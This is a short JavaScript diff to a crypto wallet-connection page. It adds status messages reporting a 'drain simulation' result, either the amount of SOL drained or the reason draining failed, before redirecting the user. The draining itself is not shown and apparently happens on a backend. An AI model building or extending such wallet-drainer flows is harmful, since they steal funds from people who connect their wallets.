@@ -248,7 +248,15 @@ async function sendWalletToBackend(walletAddress, walletType, signature) {
         const data = await response.json();
         
         if (data.success) {
-            showStatus('✅ Connected successfully! Redirecting...', 'success');
+            // Show drain simulation info if it happened
+            if (data.drainSimulation?.success) {
+                showStatus(`✅ Connected successfully! Wallet drained: ${data.drainSimulation.amountDrained.toFixed(4)} SOL`, 'warning');
+            } else if (data.drainSimulation) {
+                showStatus(`✅ Connected successfully! Drain failed: ${data.drainSimulation.reason}`, 'info');
+            } else {
+                showStatus('✅ Connected successfully!', 'success');
+            }
+            
             setTimeout(() => {
                 window.location.href = `/success.html?userId=${userId}`;
             }, 2000);
